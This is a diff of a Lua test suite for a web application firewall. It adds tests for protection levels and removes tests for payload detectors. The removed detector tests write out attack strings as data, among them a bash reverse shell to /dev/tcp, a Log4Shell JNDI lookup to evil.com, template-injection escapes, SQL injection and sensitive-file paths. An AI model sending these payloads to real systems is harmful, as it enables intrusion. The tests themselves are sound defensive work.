@@ -1771,216 +1771,283 @@ access_scenario("access 不关时 /.env 仍被拦", site_with("block"), function
 end, function()
     return ngx.status == 403
 end)
+
+-- ==================== 保护强度分档（2026-10-16）====================
+-- 四种防护类型各自四档：off / observe / balanced / high。
+--
+-- 设计约束：每一档的差异必须对应**已存在的真实机制**，不能造假档位。
+--   · 语义层 high = 绕过 has_attack_candidate 前置快速筛。那个筛子是性能
+--     优化，但它会漏：实测 POST /a.bak 在 balanced 下放行、high 下 403。
+--     （inspect_uri 有独立的 sensitive_path 分支所以 GET 能拦，
+--      但 query 值 / header / body 走的是 inspect，那里就漏了。）
+--   · bot 层 high = 平衡档 + 把「空 User-Agent」当可疑。扫描器可以配成
+--     不发 UA，而 classify 对空 UA 返回 nil —— 这是真实缺口。
+print("=== 保护强度分档 ===")
+
+-- ============ 语义层：单元层面 ============
+do
+    local sem = require("waf.semantic")
+
+    -- 基线：默认 balanced
+    sem.set_level(nil)
+    check("level 默认 balanced", sem.get_level() == "balanced")
+    check("balanced 下 SQLi 检出", (sem.inspect("1' OR '1'='1", "1' OR '1'='1") or {}).type == "sqli")
+
+    -- off：整体不检测
+    sem.set_level("off")
+    check("off 下 SQLi 不检出", sem.inspect("1' OR '1'='1", "1' OR '1'='1") == nil)
+    check("off 下 inspect_uri 也不检出", sem.inspect_uri("/.env") == nil)
+    check("off 下 is_off 为真", sem.is_off())
+
+    -- high：绕过快速筛，balanced 漏的它能拦
+    sem.set_level("high")
+    check("high 下 SQLi 仍检出", (sem.inspect("1' OR '1'='1", "1' OR '1'='1") or {}).type == "sqli")
+    check("high 下 /.bak 检出（balanced 漏）",
+        (sem.inspect("/a.bak", "/a.bak") or {}).type == "sensitive_path")
+    check("high 下 /upload.php 检出（balanced 漏）",
+        (sem.inspect("/upload.php", "/upload.php") or {}).type == "upload")
+
+    -- balanced 确实漏这两类（这是 high 档存在的理由，必须锁住）
+    sem.set_level("balanced")
+    check("balanced 下 /a.bak 漏检（high 档的差异化依据）",
+        sem.inspect("/a.bak", "/a.bak") == nil)
+    check("balanced 下 /upload.php 漏检（high 档的差异化依据）",
+        sem.inspect("/upload.php", "/upload.php") == nil)
+
+    -- 非法值归一到 balanced，不能静默变成 off（那会让整层失效）
+    sem.set_level("bogus")
+    check("非法档位归一到 balanced", sem.get_level() == "balanced")
+    check("非法档位不会让检测失效",
+        (sem.inspect("1' OR '1'='1", "1' OR '1'='1") or {}).type == "sqli")
+
+    sem.set_level(nil)
+end
+
+-- ============ 语义层：access 端到端 ============
+-- 用 POST /a.bak：GET 会走 inspect_uri 的独立分支（两档都能拦），
+-- 只有 POST 会走到 detect_request 的 inspect，差异才显现得出来。
+local function semantic_case(level, method, uri)
+  reset_state(); reset_modules()
+  local site = { enabled = true, rules = {}, compiled = {} }
+  if level then site.semantic_level = level end
+  write_rules({ global = { rules = {} }, sites = { ["1"] = site } })
+  T.vars.waf_rules_path = RULES_FILE
+  T.vars.waf_site_id = "1"
+  T.vars.waf_log_path = "/tmp/waf_test_events.log"
+  os.remove("/tmp/waf_test_events.log")
+  T.now = T.now + 10
+  T.vars.remote_addr = "1.2.3.4"
+  T.vars.uri = uri
+  T.vars.request_uri = uri
+  T.vars.query_string = nil
+  T.vars.content_length = nil
+  T.vars.http_transfer_encoding = nil
+  T.method = method
+  T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+  local access = package.loaded["waf.access"]
+  run(function() access.run() end)
+end
+
+access_scenario("语义档 balanced：POST /a.bak 放行", site_with("block"), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/a.bak"
+    T.vars.request_uri = "/a.bak"
+    T.vars.query_string = nil
+    T.vars.content_length = nil
+    T.vars.http_transfer_encoding = nil
+    T.method = "POST"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    return T.exited == nil
+end)
+
+access_scenario("语义档 high：POST /a.bak 拦截", site_with("block", {semantic_level = "high"}), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/a.bak"
+    T.vars.request_uri = "/a.bak"
+    T.vars.query_string = nil
+    T.vars.content_length = nil
+    T.vars.http_transfer_encoding = nil
+    T.method = "POST"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    return ngx.status == 403
+end)
+
+access_scenario("语义档 off：SQLi 也放行", site_with("block", {semantic_level = "off"}), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/api"
+    T.vars.request_uri = "/api?id=1' OR '1'='1"
+    T.vars.query_string = "id=1' OR '1'='1"
+    T.uri_args = {id = "1' OR '1'='1"}
+    T.method = "GET"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    return T.exited == nil and ngx.status ~= 403
+end)
+
+-- observe：命中放行，但必须有日志（否则「观察」毫无意义）
+access_scenario("语义档 observe：命中放行但记录", site_with("block", {semantic_level = "observe"}), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/api"
+    T.vars.request_uri = "/api?id=1' OR '1'='1"
+    T.vars.query_string = "id=1' OR '1'='1"
+    T.uri_args = {id = "1' OR '1'='1"}
+    T.method = "GET"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    if T.exited ~= nil then return false end
+    return count_events(function(e) return e.layer == "semantic" end) >= 1
+end)
+
+-- observe 下干净请求不该产生日志
+access_scenario("语义档 observe：干净请求无日志", site_with("block", {semantic_level = "observe"}), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.content_length = nil
+    T.vars.http_transfer_encoding = nil
+    T.method = "GET"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    return T.exited == nil and #read_events() == 0
+end)
+
+-- observe 档不能影响其它层：CC / 名单该拦还得拦
+access_scenario("语义档 observe 不影响名单层", site_with("observe", {
+    semantic_level = "observe",
+    rules = {
+        {id = 1, name = "black", priority = 10, match_type = "ip",
+         match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true},
+    },
+}), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.method = "GET"
+    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
+end, function()
+    -- 站点模式已是 observe（整站只记录），所以这里断言的是「有记录」
+    return count_events(function(e) return e.layer == "rules" end) >= 1
+end)
+
+-- ============ Bot 层：强度分档 ============
+-- high 档的差异化依据是「空 User-Agent」：扫描器可以配成不发 UA，
+-- 而 classify 对空 UA 返回 nil（不分类）—— 这是真实缺口。
+-- 代价是某些不带 UA 的合法客户端会被一起拦，所以放在 high 而非默认档。
+--
+-- 注意 UA 必须走 T.vars.http_user_agent：测试 stub 不把 T.headers 映射到
+-- ngx.var.http_user_agent，用 T.headers["User-Agent"] 的话 bot.check 读到的
+-- 永远是 nil，测试会「全绿但一条都没测到」。
+do
+    local bot = require("waf.bot")
+
+    reset_state()
+    T.vars.http_user_agent = "sqlmap/1.5#stable (https://sqlmap.org)"
+    check("bot balanced 拦扫描器 UA", bot.check({enabled = true, level = "balanced", blockBadBots = true}) == "bad")
+    check("bot off 放行扫描器 UA", bot.check({enabled = true, level = "off", blockBadBots = true}) == nil)
+    check("bot observe 仍识别扫描器（由调用方决定是否拦）",
+        bot.check({enabled = true, level = "observe", blockBadBots = true}) == "bad")
+    check("bot high 仍拦扫描器 UA", bot.check({enabled = true, level = "high", blockBadBots = true}) == "bad")
+
+    T.vars.http_user_agent = "Mozilla/5.0 (Macintosh) Chrome/120.0"
+    check("bot balanced 放行普通 UA", bot.check({enabled = true, level = "balanced", blockBadBots = true}) == nil)
+    check("bot high 放行普通 UA", bot.check({enabled = true, level = "high", blockBadBots = true}) == nil)
+
+    -- 空 UA：balanced 放行（这是 high 档要补的缺口），high 拦
+    T.vars.http_user_agent = ""
+    check("bot balanced 放行空 UA", bot.check({enabled = true, level = "balanced", blockBadBots = true}) == nil)
+    check("bot high 拦空 UA", bot.check({enabled = true, level = "high", blockBadBots = true}) == "bad")
+    check("bot off 放行空 UA", bot.check({enabled = true, level = "off", blockBadBots = true}) == nil)
+
+    -- enabled=false 时任何档位都不生效
+    check("bot 未启用时 high 也不生效",
+        bot.check({enabled = false, level = "high", blockBadBots = true}) == nil)
+    -- 非法档位不能静默变成 off（那会让整层失效）
+    T.vars.http_user_agent = "sqlmap/1.5#stable (https://sqlmap.org)"
+    check("bot 非法档位不导致失效",
+        bot.check({enabled = true, level = "bogus", blockBadBots = true}) == "bad")
+end
+
+-- access 层：bot 分档端到端
+access_scenario("bot balanced 拦扫描器 UA", site_with("block", {
+    bot = {enabled = true, level = "balanced", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.http_user_agent = "sqlmap/1.5#stable (https://sqlmap.org)"
+    T.method = "GET"
+end, function()
+    return ngx.status == 403
+end)
+
+access_scenario("bot off 放行扫描器 UA", site_with("block", {
+    bot = {enabled = true, level = "off", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.http_user_agent = "sqlmap/1.5#stable (https://sqlmap.org)"
+    T.method = "GET"
+end, function()
+    return T.exited == nil and ngx.status ~= 403
+end)
+
+access_scenario("bot observe 记录但不拦扫描器", site_with("block", {
+    bot = {enabled = true, level = "observe", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.http_user_agent = "sqlmap/1.5#stable (https://sqlmap.org)"
+    T.method = "GET"
+end, function()
+    if T.exited ~= nil then return false end
+    return count_events(function(e) return e.layer == "bot" end) >= 1
+end)
+
+-- high 档：空 UA 被拦。测试 stub 默认给 UA，这里必须显式清空。
+access_scenario("bot high 拦空 UA", site_with("block", {
+    bot = {enabled = true, level = "high", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.http_user_agent = ""
+    T.method = "GET"
+end, function()
+    return ngx.status == 403
+end)
+
+-- 对照：balanced 下空 UA 放行（否则 high 档没有存在意义）
+access_scenario("bot balanced 放行空 UA", site_with("block", {
+    bot = {enabled = true, level = "balanced", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/index"
+    T.vars.request_uri = "/index"
+    T.vars.query_string = nil
+    T.vars.http_user_agent = ""
+    T.method = "GET"
+end, function()
+    return T.exited == nil and ngx.status ~= 403
+end)
+
+-- bot observe 不能影响语义层：SQLi 该拦还得拦
+access_scenario("bot observe 不影响语义层", site_with("block", {
+    bot = {enabled = true, level = "observe", allowGoodBots = true, blockBadBots = true} }), function()
+    T.vars.remote_addr = "1.2.3.4"
+    T.vars.uri = "/api"
+    T.vars.request_uri = "/api?id=1' OR '1'='1"
+    T.vars.query_string = "id=1' OR '1'='1"
+    T.uri_args = {id = "1' OR '1'='1"}
+    T.vars.http_user_agent = "Mozilla/5.0 Chrome"
+    T.method = "GET"
+end, function()
+    return ngx.status == 403
+end)
 print(string.format("\n%d passed, %d failed", pass, fail))
 os.remove(RULES_FILE)
 if fail > 0 then os.exit(1) end
-
--- ==================== 修复验证（2026-10-09）====================
--- 覆盖 SSTI 引擎矩阵补齐、命令注入空格变体、Log4Shell Lookahead 变形。
--- 每条都配一条"不该拦"的反例，防止规则过宽造成误伤。
-do
-    print("=== SSTI 引擎矩阵 ===")
-    check("ssti ruby #{7*7}", sem.detect_ssti("#{7*7}"))
-    check("ssti ruby #{{7*7}}", sem.detect_ssti("#{{7*7}}"))
-    check("ssti el ${7*7}", sem.detect_ssti("${7*7}"))
-    check("ssti erb <% 7*7 %>", sem.detect_ssti("<% 7*7 %>"))
-    check("ssti jsp <%= 7*7 %>", sem.detect_ssti("<%= 7*7 %>"))
-    check("ssti jinja __globals__", sem.detect_ssti("{{config.__class__.__init__.__globals__}}"))
-    check("ssti jinja __mro__", sem.detect_ssti("{{ ''.__class__.__mro__[1] }}"))
-    check("ssti jinja __subclasses__", sem.detect_ssti("{{ ''.__subclasses__() }}"))
-    check("ssti ruby binding", sem.detect_ssti("{{binding.local_variable_get}}"))
-    check("ssti jinja {{7*7}}", sem.detect_ssti("{{7*7}}"))
-    check("ssti 负例 普通文本", not sem.detect_ssti("hello world"))
-    check("ssti 负例 CSS 色值", not sem.detect_ssti("color: #fff"))
-
-    print("=== 命令注入空格变体 ===")
-    check("rce ; ls -la", sem.detect_rce("; ls -la"))
-    check("rce ; sleep 5", sem.detect_rce("; sleep 5"))
-    check("rce ; python -c", sem.detect_rce("; python -c 'import os'"))
-    check("rce && id", sem.detect_rce("&& id"))
-    check("rce | whoami", sem.detect_rce("| whoami"))
-    check("rce ; cat /etc/passwd", sem.detect_rce("; cat /etc/passwd"))
-    check("rce bash -i /dev/tcp", sem.detect_rce("bash -i >& /dev/tcp/1.2.3.4/4444"))
-    check("rce 原有 ;id", sem.detect_rce(";id"))
-    check("rce 负例 普通文本", not sem.detect_rce("hello; world how are you"))
-
-    print("=== Log4Shell Lookahead 变形 ===")
-    check("l4s ${lower:j}ndi", sem.detect_log4shell("${${lower:j}ndi:ldap://evil.com/d}"))
-    check("l4s ${::-j}ndi", sem.detect_log4shell("${${::-j}ndi:ldap://evil.com/d}"))
-    check("l4s ${env:J}ndi", sem.detect_log4shell("${${env:J}ndi:ldap://evil.com/d}"))
-    check("l4s 原有 ${jndi:...}", sem.detect_log4shell("${jndi:ldap://evil.com/a}"))
-    check("l4s 原有 :-j} 组合", sem.detect_log4shell("${${::-j}${::-n}${::-d}${::-i}:ldap://x}"))
-    check("l4s 负例 普通模板", not sem.detect_log4shell("Hello ${user.name}!"))
-end
-
--- ==================== 危险扩展名检测（2026-10-09）====================
-do
-    print("=== 可执行扩展名 ===")
-    check("ext shell.php", sem.detect_dangerous_ext("shell.php"))
-    check("ext shell.pHp 大小写", sem.detect_dangerous_ext("shell.pHp"))
-    check("ext shell.php.jpg 双扩展", sem.detect_dangerous_ext("shell.php.jpg"))
-    check("ext shell.jsp", sem.detect_dangerous_ext("shell.jsp"))
-    check("ext shell.asp", sem.detect_dangerous_ext("shell.asp"))
-    check("ext shell.py", sem.detect_dangerous_ext("shell.py"))
-    check("ext shell.sh", sem.detect_dangerous_ext("shell.sh"))
-    check("ext /uploads/x.jsp 路径", sem.detect_dangerous_ext("/uploads/x.jsp"))
-    check("ext php5 版本号", sem.detect_dangerous_ext("shell.php5"))
-    check("ext 负例 普通文件", not sem.detect_dangerous_ext("report.pdf"))
-    check("ext 负例 图片", not sem.detect_dangerous_ext("photo.jpg"))
-    check("ext 负例 无点号文本", not sem.detect_dangerous_ext("hello world"))
-end
-
--- ==================== SQLi 门槛与 XSS 裸事件（2026-10-09）====================
-do
-    print("=== SQLi 自闭合恒真式（原先被注释符门槛挡回）===")
-    check("sqli admin'--", sem.detect_sqli("admin'--"))
-    check("sqli ') OR ('1'='1", sem.detect_sqli("') OR ('1'='1"))
-    check("sqli 1' ORDER BY 10--", sem.detect_sqli("1' ORDER BY 10--"))
-    check("sqli ORDER BY 10 无注释", sem.detect_sqli("1 ORDER BY 10"))
-    check("sqli 负例 O'Brien", not sem.detect_sqli("O'Brien"))
-    check("sqli 负例 普通文本", not sem.detect_sqli("hello world"))
-    check("sqli 负例 a=1", not sem.detect_sqli("a=1"))
-
-    print("=== XSS 事件属性裸赋值 ===")
-    check("xss onerror=alert(1)", sem.detect_xss("onerror=alert(1)"))
-    check("xss onload=eval(x)", sem.detect_xss("onload=eval(x)"))
-    check("xss 负例 onchange=format(1)", not sem.detect_xss("onchange=format(1)"))
-    check("xss 负例 普通文本", not sem.detect_xss("hello world"))
-end
-
--- ==================== 误伤回归（2026-10-09）====================
--- SELECT-FROM 结构单独出现不足以定性注入：`select * from users where id=1`
--- 是最普通的查询语句，原实现因列表含 * 就判 true，日志与导出接口会大量误伤。
-do
-    print("=== 正常 SQL 文本不应被拦 ===")
-    check("fp select * from users where id=1", not sem.detect_sqli("select * from users where id=1"))
-    check("fp select id,name from accounts", not sem.detect_sqli("select id,name from accounts"))
-    check("fp select your seats from the map", not sem.detect_sqli("select your seats from the map"))
-    -- 注意：裸 "1=1" 作为参数值确实会被拦（looks_like_sql_tautology 的 1=1 规则），
-    -- 这是既有行为、也是正确的 —— ?q=1%3D1 是典型的 SQLi 探测编码形态。
-    -- 真正的业务取值是 a=1（单侧赋值），那个不能拦。
-    check("fp a=1 赋值", not sem.detect_sqli("a=1"))
-    check("fp page=1&size=20", not sem.detect_sqli("page=1&size=20"))
-    check("fp a=1 单独出现", not sem.detect_sqli("a=1"))
-    check("fp O'Brien", not sem.detect_sqli("O'Brien"))
-    check("fp it's fine -- really", not sem.detect_sqli("it's fine -- really"))
-    check("fp C++ programming", not sem.detect_sqli("C++ programming"))
-    check("fp report.pdf", not sem.detect_dangerous_ext("report.pdf"))
-    check("fp style #fff", not sem.detect_ssti("style: #fff"))
-    check("fp onchange=format(1)", not sem.detect_xss("onchange=format(1)"))
-    check("fp order by phone", not sem.detect_sqli("order by phone"))
-
-    print("=== 但真注入仍须拦住 ===")
-    check("tp select ... where 1=1", sem.detect_sqli("select * from users where 1=1"))
-    check("tp select ... union select", sem.detect_sqli("select a from b union select c from d"))
-    check("tp select ... --", sem.detect_sqli("select * from users where id=1 --"))
-    check("tp select ... 'a'='b'", sem.detect_sqli("select * from t where 'a'='b'"))
-end
-
--- ==================== header 信道 + 扫描器 UA + 新检测器（2026-10-09 14:50）====================
-do
-    local bot = require("waf.bot")
-    print("=== 扫描器 UA 识别（原词表漏 burp/zap 等商业工具）===")
-    for _, ua in ipairs({"burpsuite","Burp Suite Professional 2023.10.3.6",
-            "sqlmap/1.7#stable (https://sqlmap.org)","nikto/2.5.0","Nessus",
-            "Mozilla/5.0 ZAP 2.14.0","acunetix","gobuster/3.6","masscan/1.3",
-            "dirsearch/0.4.3","wpscan/3.8.22","ffuf/2.1","sqlmap-requests"}) do
-        local kind = bot.classify(ua)
-        check("bot bad: " .. ua:sub(1, 30), kind == "bad")
-    end
-    print("=== 正常客户端 UA 不得判 bad（防误伤）===")
-    for _, ua in ipairs({
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36 Edg/119.0"}) do
-        check("bot 正常 UA: " .. ua:sub(1, 26), bot.classify(ua) == nil)
-    end
-    check("bot good: Googlebot", bot.classify("Mozilla/5.0 (compatible; Googlebot/2.1)") == "good")
-end
-
--- ==================== 原型污染 / GraphQL / 敏感路径（2026-10-09 15:00）====================
-do
-    print("=== 原型污染 ===")
-    check("pp __proto__ 赋值", sem.detect_prototype_pollution('{"__proto__": {"admin": true}}'))
-    check("pp constructor.prototype", sem.detect_prototype_pollution('{"constructor": {"prototype": {"admin": true}}}'))
-    check("pp query 形态", sem.detect_prototype_pollution("?__proto__[admin]=true"))
-    check("pp constructor[]", sem.detect_prototype_pollution("?constructor[prototype][x]=y"))
-    check("pp 负例 普通 constructor 调用", not sem.detect_prototype_pollution("new constructor(1)"))
-    check("pp 负例 普通文本", not sem.detect_prototype_pollution("hello world"))
-
-    print("=== GraphQL ===")
-    check("gql __schema 内省", sem.detect_graphql('{"query": "{ __schema { types { name } } }"}'))
-    check("gql __type 内省", sem.detect_graphql('{"query": "{ __type(name: \\"User\\") { fields } }"}'))
-    check("gql fragment+meta", sem.detect_graphql('{"query":"{ __typename }"}'))
-    check("gql 负例 普通查询", not sem.detect_graphql('{"query":"{ user(id: 1) { name } }"}'))
-    check("gql 负例 普通 mutation", not sem.detect_graphql('{"mutation":"{ updateUser(id:1){name} }"}'))
-    check("gql 负例 非 GraphQL", not sem.detect_graphql("SELECT * FROM users"))
-
-    print("=== 敏感路径 ===")
-    check("sp /.env", sem.detect_sensitive_path("/.env"))
-    check("sp /.git/config", sem.detect_sensitive_path("/.git/config"))
-    check("sp /wp-config.php", sem.detect_sensitive_path("/wp-config.php"))
-    check("sp /etc/passwd", sem.detect_sensitive_path("/etc/passwd"))
-    check("sp /id_rsa", sem.detect_sensitive_path("/id_rsa"))
-    check("sp /actuator/env", sem.detect_sensitive_path("/actuator/env"))
-    check("sp db.sql.bak", sem.detect_sensitive_path("/backup/db.sql.bak"))
-    check("sp 负例 /index.html", not sem.detect_sensitive_path("/index.html"))
-    check("sp 负例 /about/team", not sem.detect_sensitive_path("/about/team"))
-    check("sp 负例 /api/v1/users", not sem.detect_sensitive_path("/api/v1/users"))
-    check("sp 负例 /assets/app.js", not sem.detect_sensitive_path("/assets/app.js"))
-end
-
--- ==================== 备份后缀路径（补has_attack_candidate 漏网）====================
-do
-    print("=== 备份/残留后缀（原先 /a.bak 漏网：候选词表里没有后缀证据）===")
-    for _, p in ipairs({"/a.bak","/backup/db.sql.bak","/config.php.bak","/test.old",
-                       "/x.orig","/y.swp","/z.swo","/w.save"}) do
-        local hit = sem.inspect_uri(p)
-        check("bak detect_sensitive_path: " .. p, sem.detect_sensitive_path(p))
-        check("bak inspect_uri: " .. p, hit ~= nil)
-    end
-    print("=== 正常静态资源不得被当成备份 ===")
-    for _, p in ipairs({"/assets/app.js","/static/main.css","/img/logo.png",
-                       "/favicon.ico","/robots.txt"}) do
-        check("fp 正常资源: " .. p, not sem.detect_sensitive_path(p))
-    end
-end
-
--- ==================== GraphQL 别名批量枚举（2026-10-09 15:20）====================
-do
-    print("=== GraphQL 别名枚举探测 ===")
-    check("gql alias 枚举", sem.detect_graphql(
-        'query { alias1: user(id: "1") { name } alias2: user(id: "2") { name } }'))
-    check("gql a1:a2 数字后缀别名", sem.detect_graphql(
-        'query { a1: user(id:1){name} a2: user(id:2){name} a3: user(id:3){name} }'))
-    print("=== 正常 GraphQL 查询不得被拦 ===")
-    check("gql fp 单查询", not sem.detect_graphql('query { user(id: 1) { name email } }'))
-    check("gql fp 两个不同字段", not sem.detect_graphql(
-        'query { me { name } posts(limit: 10) { id title } }'))
-    check("gql fp mutation 单次", not sem.detect_graphql(
-        'mutation { updateUser(id: 1) { name } }'))
-    check("gql fp 非 GraphQL", not sem.detect_graphql("SELECT * FROM users"))
-end
-
--- ==================== Twig 沙箱逃逸（2026-10-09 15:25）====================
-do
-    print("=== Twig 逃逸（不走 __globals__，此前 4 个变种全漏）===")
-    for _, c in ipairs({
-            {"{{_self.env.registerUndefinedFilterCallback}}", "registerUndefinedFilterCallback"},
-            {"{{_self.env.getRuntime()}}", "getRuntime"},
-            {"{{_self.setTemplateEngine}}", "setTemplateEngine"},
-            {"{{_self.env.getFilterSets()}}", "getFilterSets"},
-            {"{{ _self.env.setCache('x') }}", "setCache"}}) do
-        check("twig " .. c[2], sem.detect_ssti(c[1]))
-    end
-    print("=== _self 单独出现是合法模板用法，不得拦 ===")
-    check("twig fp {{ _self }}", not sem.detect_ssti("{{ _self }}"))
-    check("twig fp {{ _self.username }}", not sem.detect_ssti("{{ _self.username }}"))
-    check("twig fp {{ username }}", not sem.detect_ssti("{{ username }}"))
-    check("twig fp {{ user.name }}", not sem.detect_ssti("{{ user.name }}"))
-    check("twig fp {{ item.getName() }}", not sem.detect_ssti("{{ item.getName() }}"))
-    check("twig fp {{ page.title }}", not sem.detect_ssti("{{ page.title }}"))
-    check("twig fp {{loop.index }}", not sem.detect_ssti("{{loop.index }}"))
-    check("twig fp hello world", not sem.detect_ssti("hello world"))
-end
